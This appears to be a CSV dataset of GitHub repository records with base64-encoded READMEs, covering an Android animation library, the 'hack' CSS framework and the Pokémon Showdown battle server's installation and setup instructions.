ZXcgaW50W117IDQ1MCwgMjAwIH07CiAgICBmaW5hbCBpbnRbXSBSSUdIVF9D
T05UUk9MX1BPSU5UID0gbmV3IGludFtdeyAxNTAsIDIwMCB9OwogICAgUGF0
aCBwYXRoID0gbmV3IFBhdGgoKTsKICAgIHBhdGgubW92ZVRvKFNUQVJUX1BP
SU5UWzBdLCBTVEFSVF9QT0lOVFsxXSk7CiAgICBwYXRoLnF1YWRUbyhSSUdI
VF9DT05UUk9MX1BPSU5UWzBdLCBSSUdIVF9DT05UUk9MX1BPSU5UWzFdLCBC
T1RUT01fUE9JTlRbMF0sIEJPVFRPTV9QT0lOVFsxXSk7CiAgICBwYXRoLnF1
YWRUbyhMRUZUX0NPTlRST0xfUE9JTlRbMF0sIExFRlRfQ09OVFJPTF9QT0lO
VFsxXSwgU1RBUlRfUE9JTlRbMF0sIFNUQVJUX1BPSU5UWzFdKTsKICAgIHBh
dGguY2xvc2UoKTsKICAgIFZpZXdBbmltYXRvci5hbmltYXRlKHZpZXcpLnBh
dGgocGF0aCkucmVwZWF0Q291bnQoLTEpLnN0YXJ0KCk7CmBgYAoKCiMgRG93
bmxvYWQKCjxhIGhyZWY9J2h0dHBzOi8va28tZmkuY29tL0ExNjBMQ0MnIHRh
cmdldD0nX2JsYW5rJz48aW1nIGhlaWdodD0nMzYnIHN0eWxlPSdib3JkZXI6
MHB4O2hlaWdodDozNnB4Oycgc3JjPSdodHRwczovL2F6NzQzNzAyLnZvLm1z
ZWNuZC5uZXQvY2RuL2tvZmkxLnBuZz92PTAnIGJvcmRlcj0nMCcgYWx0PSdC
dXkgTWUgYSBDb2ZmZWUgYXQga28tZmkuY29tJyAvPjwvYT4KCkFkZCBpbnRv
IHlvdXIgKipidWlsZC5ncmFkbGUqKgoKWyFbRG93bmxvYWRdKGh0dHBzOi8v
YXBpLmJpbnRyYXkuY29tL3BhY2thZ2VzL2Zsb3JlbnQzNy9tYXZlbi9WaWV3
QW5pbWF0b3IvaW1hZ2VzL2Rvd25sb2FkLnN2ZyldKGh0dHBzOi8vYmludHJh
eS5jb20vZmxvcmVudDM3L21hdmVuL1ZpZXdBbmltYXRvci9fbGF0ZXN0VmVy
c2lvbikKCmBgYGdyb292eQpjb21waWxlICdjb20uZ2l0aHViLmZsb3JlbnQz
Nzp2aWV3YW5pbWF0b3I6MS4xLjAnCmBgYAoKIyBDb21tdW5pdHkKCkxvb2tp
bmcgZm9yIGNvbnRyaWJ1dG9ycywgZmVlbCBmcmVlIHRvIGZvcmsgIQoKIyBD
cmVkaXRzCgpBdXRob3I6IEZsb3JlbnQgQ2hhbXBpZ255ICAgCkNvbnRyaWJ1
dG9yOiBb5p2O546J5rGfKGxpeXVqaWFuZyldKGh0dHBzOi8vZ2l0aHViLmNv
bS9nenUtbGl5dWppYW5nL1ZpZXdBbmltYXRvcikgICAKCkZpY2hlcyBQbGF0
ZWF1IE1vdG8gOiBbaHR0cHM6Ly93d3cuZmljaGVzLXBsYXRlYXUtbW90by5m
ci9dKGh0dHBzOi8vd3d3LmZpY2hlcy1wbGF0ZWF1LW1vdG8uZnIvKQoKPGEg
aHJlZj0iaHR0cHM6Ly9nb28uZ2wvV1hXOERjIj4KICA8aW1nIGFsdD0iQW5k
cm9pZCBhcHAgb24gR29vZ2xlIFBsYXkiIHNyYz0iaHR0cHM6Ly9kZXZlbG9w
ZXIuYW5kcm9pZC5jb20vaW1hZ2VzL2JyYW5kL2VuX2FwcF9yZ2Jfd29fNDUu
cG5nIiAvPgo8L2E+Cgo8YSBocmVmPSJodHRwczovL3BsdXMuZ29vZ2xlLmNv
bS8rZmxvcmVudGNoYW1waWdueSI+CiAgPGltZyBhbHQ9IkZvbGxvdyBtZSBv
biBHb29nbGUrIgogICAgICAgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2Vy
Y29udGVudC5jb20vZmxvcmVudDM3L0RhVmluY2kvbWFzdGVyL21vYmlsZS9z
cmMvbWFpbi9yZXMvZHJhd2FibGUtaGRwaS9ncGx1cy5wbmciIC8+CjwvYT4K
PGEgaHJlZj0iaHR0cHM6Ly90d2l0dGVyLmNvbS9mbG9yZW50X2NoYW1wIj4K
ICA8aW1nIGFsdD0iRm9sbG93IG1lIG9uIFR3aXR0ZXIiCiAgICAgICBzcmM9
Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9mbG9yZW50Mzcv
RGFWaW5jaS9tYXN0ZXIvbW9iaWxlL3NyYy9tYWluL3Jlcy9kcmF3YWJsZS1o
ZHBpL3R3aXR0ZXIucG5nIiAvPgo8L2E+CjxhIGhyZWY9Imh0dHBzOi8vZnIu
bGlua2VkaW4uY29tL2luL2Zsb3JlbnRjaGFtcGlnbnkiPgogIDxpbWcgYWx0
PSJGb2xsb3cgbWUgb24gTGlua2VkSW4iCiAgICAgICBzcmM9Imh0dHBzOi8v
cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9mbG9yZW50MzcvRGFWaW5jaS9t
YXN0ZXIvbW9iaWxlL3NyYy9tYWluL3Jlcy9kcmF3YWJsZS1oZHBpL2xpbmtl
ZGluLnBuZyIgLz4KPC9hPgoKIyBMaWNlbnNlCgogICAgQ29weXJpZ2h0IDIw
MTUgZmxvcmVudDM3LCBJbmMuCgogICAgTGljZW5zZWQgdW5kZXIgdGhlIEFw
YWNoZSBMaWNlbnNlLCBWZXJzaW9uIDIuMCAodGhlICJMaWNlbnNlIik7CiAg
ICB5b3UgbWF5IG5vdCB1c2UgdGhpcyBmaWxlIGV4Y2VwdCBpbiBjb21wbGlh
bmNlIHdpdGggdGhlIExpY2Vuc2UuCiAgICBZb3UgbWF5IG9idGFpbiBhIGNv
cHkgb2YgdGhlIExpY2Vuc2UgYXQKCiAgICAgICBodHRwOi8vd3d3LmFwYWNo
ZS5vcmcvbGljZW5zZXMvTElDRU5TRS0yLjAKCiAgICBVbmxlc3MgcmVxdWly
ZWQgYnkgYXBwbGljYWJsZSBsYXcgb3IgYWdyZWVkIHRvIGluIHdyaXRpbmcs
IHNvZnR3YXJlCiAgICBkaXN0cmlidXRlZCB1bmRlciB0aGUgTGljZW5zZSBp
cyBkaXN0cmlidXRlZCBvbiBhbiAiQVMgSVMiIEJBU0lTLAogICAgV0lUSE9V
VCBXQVJSQU5USUVTIE9SIENPTkRJVElPTlMgT0YgQU5ZIEtJTkQsIGVpdGhl
ciBleHByZXNzIG9yIGltcGxpZWQuCiAgICBTZWUgdGhlIExpY2Vuc2UgZm9y
IHRoZSBzcGVjaWZpYyBsYW5ndWFnZSBnb3Zlcm5pbmcgcGVybWlzc2lvbnMg
YW5kCiAgICBsaW1pdGF0aW9ucyB1bmRlciB0aGUgTGljZW5zZS4K
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'hack',63490836,b'\xe2\x9b\xb7 Dead simple CSS framework.',b'CSS',20,2377,,2377,False,b'https://api.github.com/repos/egoist/hack/forks',"PHAgYWxpZ249ImNlbnRlciI+CiAgPGltZyBzcmM9Ii4vbWVkaWEvbG9nby5w
bmciIHdpZHRoPSI2MCIgLz48YnI+PGJyPgogIDxhIGhyZWY9Imh0dHBzOi8v
bnBtanMuY29tL3BhY2thZ2UvaGFjayI+PGltZyBzcmM9Imh0dHBzOi8vaW1n
LnNoaWVsZHMuaW8vbnBtL3YvaGFjay5zdmc/c3R5bGU9ZmxhdC1zcXVhcmUi
IGFsdD0ibnBtIHZlcnNpb24iPjwvYT4gPGEgaHJlZj0iaHR0cHM6Ly9ucG1q
cy5jb20vcGFja2FnZS9oYWNrIj48aW1nIHNyYz0iaHR0cHM6Ly9pbWcuc2hp
ZWxkcy5pby9ucG0vZG0vaGFjay5zdmc/c3R5bGU9ZmxhdC1zcXVhcmUiIGFs
dD0ibnBtIGRvd25sb2FkcyI+PC9hPiA8YSBocmVmPSJodHRwczovL2dpdHRl
ci5pbS9lZ29pc3QvaGFjayI+PGltZyBzcmM9Imh0dHBzOi8vaW1nLnNoaWVs
ZHMuaW8vZ2l0dGVyL3Jvb20vZWdvaXN0L2hhY2suc3ZnP3N0eWxlPWZsYXQt
c3F1YXJlIiBhbHQ9IkdpdHRlciI+PC9hPgo8L3A+Cgo8ZGV0YWlscz48c3Vt
bWFyeT5UYWJsZSBvZiBDb250ZW50czwvc3VtbWFyeT4KCjwhLS0gdG9jIC0t
PgoKLSBbSW5zdGFsbF0oI2luc3RhbGwpCi0gW1JlbGF0ZWQgcHJvamVjdHNd
KCNyZWxhdGVkLXByb2plY3RzKQotIFtEZXZlbG9wbWVudF0oI2RldmVsb3Bt
ZW50KQotIFtMaWNlbnNlXSgjbGljZW5zZSkKCjwhLS0gdG9jc3RvcCAtLT4K
CjwvZGV0YWlscz4KCiMjIEluc3RhbGwKCmBgYGJhc2gKJCBucG0gaW5zdGFs
bCAtLXNhdmUgaGFjawpgYGAKCk9wdGlvbiAjMTogVXNlIGFueSBwcmUtcHJv
Y2Vzc29yCgpgYGBqcwppbXBvcnQgJ2hhY2snCmBgYAoKT3B0aW9uICMyOiBo
b3QtbGluayB0aGUgY3NzIGZpbGVzOgoKYGBgaHRtbAo8bGluayByZWw9InN0
eWxlc2hlZXQiIGhyZWY9Ii9wYXRoL3RvL2hhY2suY3NzIj4KCjwhLS0gbWFy
a2Rvd24gdGhlbWUgLS0+Cjxib2R5IGNsYXNzPSJoYWNrIj48L2JvZHk+Cgo8
IS0tIHN0YW5kYXJkIHRoZW1lIC0tPgo8bGluayByZWw9InN0eWxlc2hlZXQi
IGhyZWY9Ii9wYXRoL3RvL3N0YW5kYXJkLmNzcyI+Cjxib2R5IGNsYXNzPSJz
dGFuZGFyZCI+PC9ib2R5PgoKPCEtLSBkYXJrIHRoZW1lIC0tPgo8bGluayBy
ZWw9InN0eWxlc2hlZXQiIGhyZWY9Ii9wYXRoL3RvL2RhcmsuY3NzIj4KPGJv
ZHkgY2xhc3M9ImhhY2sgZGFyayI+PC9ib2R5PgoKPCEtLSBkYXJrLWdyZXkg
dGhlbWUgLS0+CjxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iL3BhdGgv
dG8vZGFyay1ncmV5LmNzcyI+Cjxib2R5IGNsYXNzPSJoYWNrIGRhcmstZ3Jl
eSI+PC9ib2R5PgoKPCEtLSBzb2xhcml6ZWQtZGFyayB0aGVtZSAtLT4KPGxp
bmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIvcGF0aC90by9zb2xhcml6ZWQt
ZGFyay5jc3MiPgo8Ym9keSBjbGFzcz0iaGFjayBzb2xhcml6ZWQtZGFyayI+
PC9ib2R5PgpgYGAKCkl0J3MgYWxzbyBhdmFpbGFibGUgb24gW0NETkpTXSho
dHRwczovL2NkbmpzLmNvbS9saWJyYXJpZXMvaGFjayksIFtqc0RlbGl2cl0o
aHR0cDovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2hhY2svZGlzdC8pIGFuZCBb
VU5QS0ddKGh0dHBzOi8vdW5wa2cuY29tL2hhY2svKS4KCkZvciBtb3JlIHVz
YWdlcyBhbmQgc3R5bGUgZ3VpZGVsaW5lIGhlYWQgdG8gW3RoZSB3ZWJzaXRl
XShodHRwOi8vaGFja2Nzcy5lZ29pc3QubW9lLykg8J+OiQoKIyMgU2hvd2Nh
c2UKCltBIGxpc3Qgb2YgcHJvamVjdHMgdGhhdCB1c2UgYGhhY2tgXShodHRw
czovL2dpdGh1Yi5jb20vZWdvaXN0L2hhY2svd2lraS9TaG93Y2FzZSkuCgoj
IyBSZWxhdGVkIHByb2plY3RzCgotIFtKZWt5bGwgdGhlbWUgZm9yIEhhY2td
KGh0dHBzOi8vZ2l0aHViLmNvbS93ZW1ha2Utc2VydmljZXMvamVreWxsLXRo
ZW1lLWhhY2tjc3MpCi0gW0h1Z28gdGhlbWUgZm9yIEhhY2tdKGh0dHBzOi8v
YWZ0ZXItZGFyay5oYWJkLmFzKQotIFtHdXRlbmJlcmcgdGhlbWUgZm9yIEhh
Y2tdKGh0dHBzOi8vd3d3LmdldGd1dGVuYmVyZy5pby90aGVtZXMvYWZ0ZXIt
ZGFyay8pCgojIyBNaXJyb3JzCgotIGh0dHBzOi8vZ2l0LmhhYmQuYXMvamhh
YmRhcy9oYWNrCgojIyBEZXZlbG9wbWVudAoKYGBgYmFzaAokIG5wbSBydW4g
ZGV2CgokIG5wbSBydW4gYnVpbGQKYGBgCgojIyBMaWNlbnNlCgpNSVQgJmNv
cHk7IFtFR09JU1RdKGh0dHBzOi8vZ2l0aHViLmNvbS9lZ29pc3QpCgpMb2dv
IHdhcyBnZW5lcmF0ZWQgd2l0aCBbc2xvZ2FuXShodHRwczovL2dpdGh1Yi5j
b20vZWdvaXN0L3Nsb2dhbikuCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'pokemon-showdown',3038446,b'Pok\xc3\xa9mon battle simulator.',b'JavaScript',111,2377,,2377,False,b'https://api.github.com/repos/smogon/pokemon-showdown/forks',"UG9rw6ltb24gU2hvd2Rvd24KPT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
CgpOYXZpZ2F0aW9uOiBbV2Vic2l0ZV1bMV0gfCAqKlNlcnZlciByZXBvc2l0
b3J5KiogfCBbQ2xpZW50IHJlcG9zaXRvcnldWzJdIHwgW0RleCByZXBvc2l0
b3J5XVszXQoKICBbMV06IGh0dHA6Ly9wb2tlbW9uc2hvd2Rvd24uY29tLwog
IFsyXTogaHR0cHM6Ly9naXRodWIuY29tL1phcmVsL1Bva2Vtb24tU2hvd2Rv
d24tQ2xpZW50CiAgWzNdOiBodHRwczovL2dpdGh1Yi5jb20vWmFyZWwvUG9r
ZW1vbi1TaG93ZG93bi1EZXgKClshW0J1aWxkIFN0YXR1c10oaHR0cHM6Ly90
cmF2aXMtY2kuY29tL3Ntb2dvbi9wb2tlbW9uLXNob3dkb3duLnN2Zz9icmFu
Y2g9bWFzdGVyKV0oaHR0cHM6Ly90cmF2aXMtY2kuY29tL3Ntb2dvbi9wb2tl
bW9uLXNob3dkb3duKQpbIVtEZXBlbmRlbmN5IFN0YXR1c10oaHR0cHM6Ly9k
YXZpZC1kbS5vcmcvemFyZWwvUG9rZW1vbi1TaG93ZG93bi5zdmcpXShodHRw
czovL2RhdmlkLWRtLm9yZy96YXJlbC9Qb2tlbW9uLVNob3dkb3duKQpbIVtk
ZXZEZXBlbmRlbmN5IFN0YXR1c10oaHR0cHM6Ly9kYXZpZC1kbS5vcmcvemFy
ZWwvUG9rZW1vbi1TaG93ZG93bi9kZXYtc3RhdHVzLnN2ZyldKGh0dHBzOi8v
ZGF2aWQtZG0ub3JnL3phcmVsL1Bva2Vtb24tU2hvd2Rvd24/dHlwZT1kZXYp
ClshW1RvdGFsIEFsZXJ0c10oaHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9sZ3Rt
L2FsZXJ0cy9nL1phcmVsL1Bva2Vtb24tU2hvd2Rvd24uc3ZnP2xvZ289bGd0
bSZsb2dvV2lkdGg9MTgpXShodHRwczovL2xndG0uY29tL3Byb2plY3RzL2cv
WmFyZWwvUG9rZW1vbi1TaG93ZG93bi9hbGVydHMpCgpJbnRyb2R1Y3Rpb24K
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpUaGlzIGlzIHRoZSBzb3Vy
Y2UgY29kZSBmb3IgdGhlIGdhbWUgc2VydmVyIG9mIFtQb2vDqW1vbiBTaG93
ZG93bl1bNF0sIGEgd2Vic2l0ZSBmb3IgUG9rw6ltb24gYmF0dGxpbmcuIFBv
a8OpbW9uIFNob3dkb3duIHNpbXVsYXRlcyBzaW5nbGVzLCBkb3VibGVzIGFu
ZCB0cmlwbGVzIGJhdHRsZXMgaW4gYWxsIHRoZSBnYW1lcyBvdXQgc28gZmFy
IChHZW5lcmF0aW9ucyAxIHRocm91Z2ggOCkuCgpUaGlzIHJlcG9zaXRvcnkg
Y29udGFpbnMgdGhlIGZpbGVzIG5lZWRlZCB0byBzZXQgdXAgeW91ciBvd24g
UG9rw6ltb24gU2hvd2Rvd24gc2VydmVyLiBOb3RlIHRoYXQgdG8gc2V0IHVw
IGEgc2VydmVyLCB5b3UnbGwgYWxzbyBuZWVkIGEgc2VydmVyIGNvbXB1dGVy
LgoKWW91IGNhbiB1c2UgeW91ciBvd24gY29tcHV0ZXIgYXMgYSBzZXJ2ZXIs
IGJ1dCBmb3Igb3RoZXIgcGVvcGxlIHRvIGNvbm5lY3QgdG8geW91ciBjb21w
dXRlciwgeW91J2xsIG5lZWQgdG8gZXhwb3NlIGEgcG9ydCAoZGVmYXVsdCBp
cyA4MDAwIGJ1dCB5b3UgY2FuIGNob29zZSBhIGRpZmZlcmVudCBvbmUpIHRv
IGNvbm5lY3QgdG8sIHdoaWNoIHNvbWV0aW1lcyByZXF1aXJlcyBbcG9ydCBm
b3J3YXJkaW5nXVs1XS4gTm90ZSB0aGF0IHNvbWUgaW50ZXJuZXQgcHJvdmlk
ZXJzIGRvbid0IGxldCB5b3UgaG9zdCBhIHNlcnZlciBhdCBhbGwsIGluIHdo
aWNoIGNhc2UgeW91J2xsIGhhdmUgdG8gcmVudCBhIFZQUyB0byB1c2UgYXMg
YSBzZXJ2ZXIuCgogIFs0XTogaHR0cDovL3Bva2Vtb25zaG93ZG93bi5jb20v
CiAgWzVdOiBodHRwOi8vZW4ud2lraXBlZGlhLm9yZy93aWtpL1BvcnRfZm9y
d2FyZGluZwoKCkluc3RhbGxpbmcKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tCgogICAgLi9wb2tlbW9uLXNob3dkb3duCgooUmVxdWlyZXMgTm9kZS5q
cyB2MTArKQoKSWYgeW91ciBkaXN0cm8gcGFja2FnZSBtYW5hZ2VyIGhhcyBh
biBvbGQgTm9kZS5qcyB2ZXJzaW9uLCB0aGUgc2ltcGxlc3Qgd2F5IHRvIHVw
Z3JhZGUgaXMgYG5gIOKAkyB1c3VhbGx5IG5vIHJvb3QgbmVjZXNzYXJ5OgoK
ICAgIG5wbSBpbnN0YWxsIC0tZ2xvYmFsIG4KICAgIG4gbGF0ZXN0CgoKRGV0
YWlsZWQgaW5zdGFsbGF0aW9uIGluc3RydWN0aW9ucwotLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0KClBva8OpbW9uIFNob3dkb3duIHJlcXVpcmVzIHlv
dSB0byBoYXZlIFtOb2RlLmpzXVs2XSBpbnN0YWxsZWQsIHYxMC54IG9yIGxh
dGVyLgoKTmV4dCwgb2J0YWluIGEgY29weSBvZiBQb2vDqW1vbiBTaG93ZG93
bi4gSWYgeW91J3JlIHJlYWRpbmcgdGhpcyBvdXRzaWRlIG9mIEdpdEh1Yiwg
eW91J3ZlIHByb2JhYmx5IGFscmVhZHkgZG9uZSB0aGlzLiBJZiB5b3UncmUg
cmVhZGluZyB0aGlzIGluIEdpdEh1YiwgdGhlcmUncyBhICJDbG9uZSBvciBk
b3dubG9hZCIgYnV0dG9uIG5lYXIgdGhlIHRvcCByaWdodCAoaXQncyBncmVl
bikuIEkgcmVjb21tZW5kIHRoZSAiT3BlbiBpbiBEZXNrdG9wIiBtZXRob2Qg
LSB5b3UgbmVlZCB0byBpbnN0YWxsIEdpdEh1YiBEZXNrdG9wIHdoaWNoIGlz
IG1vcmUgd29yayB0aGFuICJEb3dubG9hZCBaSVAiLCBidXQgaXQgbWFrZXMg
aXQgbXVjaCBlYXNpZXIgdG8gdXBkYXRlIGluIHRoZSBsb25nIHJ1biAoaXQg
bGV0cyB5b3UgdXNlIHRoZSBgL3VwZGF0ZXNlcnZlcmAgY29tbWFuZCkuCgpQ
b2vDqW1vbiBTaG93ZG93biBpcyBpbnN0YWxsZWQgYW5kIHJ1biB1c2luZyBh
IGNvbW1hbmQgbGluZS4gSW4gTWFjIE9TIFgsIG9wZW4gYFRlcm1pbmFsYCAo
aXQncyBpbiBVdGlsaXRpZXMpLiBJbiBXaW5kb3dzLCBvcGVuIGBDb21tYW5k
IFByb21wdGAgKHR5cGUgYGNtZGAgaW50byB0aGUgU3RhcnQgbWVudSBhbmQg
aXQgc2hvdWxkIGJlIHRoZSBmaXJzdCByZXN1bHQpLiBUeXBlIHRoaXMgaW50
byB0aGUgY29tbWFuZCBsaW5lOgoKICAgIGNkIExPQ0FUSU9OCgpSZXBsYWNl
IGBMT0NBVElPTmAgd2l0aCB0aGUgbG9jYXRpb24gUG9rw6ltb24gU2hvd2Rv
d24gaXMgaW4gKGVuZGluZyB1cCB3aXRoLCBmb3IgaW5zdGFuY2UsIGBjZCAi
fi9Eb3dubG9hZHMvUG9rZW1vbi1TaG93ZG93biJgIG9yIGBjZCAiQzpcVXNl
cnNcQm9iXERvd25sb2Fkc1xQb2tlbW9uLVNob3dkb3duXCJgKS4KClRoaXMg
d2lsbCBzZXQgeW91ciBjb21tYW5kIGxpbmUncyBsb2NhdGlvbiB0byBQb2vD
qW1vbiBTaG93ZG93bidzIGZvbGRlci4gWW91J2xsIGhhdmUgdG8gZG8gdGhp
cyBlYWNoIHRpbWUgeW91IG9wZW4gYSBjb21tYW5kIGxpbmUgdG8gcnVuIGNv
bW1hbmRzIGZvciBQb2vDqW1vbiBTaG93ZG93bi4KCkNvcHkgYGNvbmZpZy9j
b25maWctZXhhbXBsZS5qc2AgaW50byBgY29uZmlnL2NvbmZpZy5qc2AsIGFu
ZCBlZGl0IGFzIHlvdSBwbGVhc2UuCgpDb25ncmF0dWxhdGlvbnMsIHlvdSdy
ZSBkb25lIHNldHRpbmcgdXAgUG9rw6ltb24gU2hvd2Rvd24uCgpOb3csIHRv
IHN0YXJ0IFBva8OpbW9uIFNob3dkb3duLCBydW4gdGhlIGNvbW1hbmQ6Cgog
ICAgbm9kZSBwb2tlbW9uLXNob3dkb3duCgooSWYgeW91J3JlIG5vdCBvbiBX
aW5kb3dzLCB3ZSByZWNvbW1lbmQgZG9pbmcgYC4vcG9rZW1vbi1zaG93ZG93
bmAgaW5zdGVhZC4pCgpZb3UgY2FuIGFsc28gc3BlY2lmeSBhIHBvcnQ6Cgog
ICAgbm9kZSBwb2tlbW9uLXNob3dkb3duIDgwMDAKClZpc2l0IHlvdXIgc2Vy
dmVyIGF0IGBodHRwOi8vU0VSVkVSOjgwMDBgCgpSZXBsYWNlIGBTRVJWRVJg
IHdpdGggeW91ciBzZXJ2ZXIgZG9tYWluIG9yIElQLiBSZXBsYWNlIGA4MDAw
YCB3aXRoIHlvdXIgcG9ydCBpZiBpdCdzIG5vdCBgODAwMGAgKHRoZSBkZWZh
dWx0IHBvcnQpLgoKWWVzLCB5b3UgY2FuIHRlc3QgZXZlbiBpZiB5b3UgYXJl
IGJlaGluZCBhIE5BVCB3aXRob3V0IHBvcnQgZm9yd2FyZGluZzogYGh0dHA6
Ly9sb2NhbGhvc3Q6ODAwMGAgd2lsbCBjb25uZWN0IHRvIHlvdXIgbG9jYWwg
bWFjaGluZS4gU29tZSBicm93c2VyIHNldHVwcyBtaWdodCBwcmV2ZW50IHRo
aXMgc29ydCBvZiBjb25uZWN0aW9uLCBob3dldmVyIChOb1NjcmlwdCwgZm9y
IGluc3RhbmNlKS4gSWYgeW91IGNhbid0IGdldCBjb25uZWN0aW5nIGxvY2Fs
bHkgdG8gd29yayBpbiBGaXJlZm94LCB0cnkgQ2hyb21lLgoKWW91IHdpbGwg
YmUgcmVkaXJlY3RlZCB0byBgaHR0cDovL1NFUlZFUi5wc2ltLnVzYC4gVGhl
IHJlYXNvbiB5b3VyIHNlcnZlciBpcyB2aXNpdGVkIHRocm91Z2ggYHBzaW0u
dXNgIGlzIHRvIG1ha2UgaXQgbW9yZSBkaWZmaWN1bHQgZm9yIHNlcnZlcnMg
dG8gc2VlIGEgdXNlcidzIHBhc3N3b3JkIGluIGFueSBmb3JtLCBieSBoYW5k
bGluZyBsb2dpbnMgZ2xvYmFsbHkuIFlvdSBjYW4gZW1iZWQgdGhpcyBpbiBh
biBgaWZyYW1lYCBpbiB5b3VyIHdlYnNpdGUgaWYgdGhlIFVSTCBpcyBhIGJp
ZyBkZWFsIHdpdGggeW91LgoKSWYgeW91IHRydWx5IHdhbnQgdG8gaG9zdCB0
aGUgY2xpZW50IHlvdXJzZWxmLCB0aGVyZSBpcyBbYSByZXBvc2l0b3J5IGZv
ciB0aGUgUG9rw6ltb24gU2hvd2Rvd24gQ2xpZW50XVs3XS4gSXQncyBub3Qg
cmVjb21tZW5kZWQgZm9yIGJlZ2lubmVycywgdGhvdWdoLgoKICBbNl06IGh0
dHBzOi8vbm9kZWpzLm9yZy8KICBbN106IGh0dHBzOi8vZ2l0aHViLmNvbS9a
YXJlbC9Qb2tlbW9uLVNob3dkb3duLUNsaWVudAoKClNldHRpbmcgdXAgYW4g
QWRtaW5pc3RyYXRvciBhY2NvdW50Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLQoKT25jZSB5b3VyIHNlcnZlciBpcyB1cCwgeW91IHByb2JhYmx5IHdh
bnQgdG8gbWFrZSB5b3Vyc2VsZiBhbiBBZG1pbmlzdHJhdG9yICh+KSBvbiBp
dC4KCiMjIyBjb25maWcvdXNlcmdyb3Vwcy5jc3YKClRvIGJlY29tZSBhbiBB
ZG1pbmlzdHJhdG9yLCBjcmVhdGUgYSBmaWxlIG5hbWVkIGBjb25maWcvdXNl
cmdyb3Vwcy5jc3ZgIGNvbnRhaW5pbmcKCiAgICBVU0VSLH4KClJlcGxhY2Ug
YFVTRVJgIHdpdGggdGhlIHVzZXJuYW1lIHRoYXQgeW91IHdvdWxkIGxpa2Ug
dG8gYmVjb21lIGFuIEFkbWluaXN0cmF0b3IuIERvIG5vdCBwdXQgYSBzcGFj
ZSBiZXR3ZWVuIHRoZSBjb21tYSBhbmQgdGhlIHRpbGRlLgoKVGhpcyB1c2Vy
bmFtZSBtdXN0IGJlIHJlZ2lzdGVyZWQuIElmIHlvdSBkbyBub3QgaGF2ZSBh
IHJlZ2lzdGVyZWQgYWNjb3VudCwgeW91IGNhbiBjcmVhdGUgb25lIHVzaW5n
IHRoZSBSZWdpc3RlciBidXR0b24gaW4gdGhlIHNldHRpbmdzIG1lbnUgKGl0
IGxvb2tzIGxpa2UgYSBnZWFyKSBpbiB0aGUgdXBwZXItcmlnaHQgb2YgUG9r
w6ltb24gU2hvd2Rvd24uCgpPbmNlIHlvdSdyZSBhbiBhZG1pbmlzdHJhdG9y
LCB5b3UgY2FuIHByb21vdGUvZGVtb3RlIG90aGVycyBlYXNpbHkgd2l0aCB0
aGUgYC9nbG9iYWxhZG1pbmAsIGAvZ2xvYmFsbGVhZGVyYCwgYC9nbG9iYWxt
b2RgLCBldGMgY29tbWFuZHMuCgoKQnJvd3NlciBzdXBwb3J0Ci0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLQoKUG9rw6ltb24gU2hvd2Rvd24gY3VycmVu
dGx5IHN1cHBvcnRzLCBpbiBvcmRlciBvZiBwcmVmZXJlbmNlOgoKIC0gQ2hy
b21lCiAtIEZpcmVmb3gKIC0gT3BlcmEKIC0gU2FmYXJpIDUrCiAtIElFMTEr
CiAtIENocm9tZS9GaXJlZm94L1NhZmFyaSBmb3IgdmFyaW91cyBtb2JpbGUg
ZGV2aWNlcwoKUG9rw6ltb24gU2hvd2Rvd24gaXMgdXNhYmxlLCBidXQgZXhw
ZWN0IGRlZ3JhZGVkIHBlcmZvcm1hbmNlIGFuZCBjZXJ0YWluIGZlYXR1cmVz
IG5vdCB0byB3b3JrIGluOgoKIC0gU2FmYXJpIDQrCiAtIElFOSsKClBva8Op
bW9uIFNob3dkb3duIGlzIG1vc3RseSBkZXZlbG9wZWQgb24gQ2hyb21lLCBh
bmQgQ2hyb21lIG9yIHRoZSBkZXNrdG9wIGNsaWVudCBpcyByZXF1aXJlZCBm
b3IgY2VydGFpbiBmZWF0dXJlcyBsaWtlIGRyYWdnaW5nLWFuZC1kcm9wcGlu
ZyB0ZWFtcyBmcm9tIFBTIHRvIHlvdXIgY29tcHV0ZXIuIEhvd2V2ZXIsIGJ1
Z3MgcmVwb3J0ZWQgb24gYW55IHN1cHBvcnRlZCBicm93c2VyIHdpbGwgdXN1
YWxseSBiZSBmaXhlZCBwcmV0dHkgcXVpY2tseS4KCgpDb21tdW5pdHkKLS0t
